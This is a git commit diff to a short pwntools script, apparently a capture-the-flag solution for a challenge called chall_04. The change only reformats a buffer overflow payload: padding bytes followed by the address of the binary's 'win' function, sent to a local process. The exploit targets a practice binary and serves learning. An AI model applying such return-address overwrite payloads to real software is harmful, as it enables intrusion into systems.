6419b2410763a1cfb5239b872d395b8c08e97ed6
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-04 19:09:52 -0400

    Update 04.py

--- chall_04/04.py
+++ chall_04/04.py
@@ -2,6 +2,5 @@ from pwn import *
 p = process("./chall_04")
 p.recv()
 payload  = b''
-payload += (0x60 - 0x8) * b'A'
-payload += p64(binary.sym.win)
+payload += ((0x60 - 0x8) * b'A' + p64(binary.sym.win))
 p.sendline(payload)
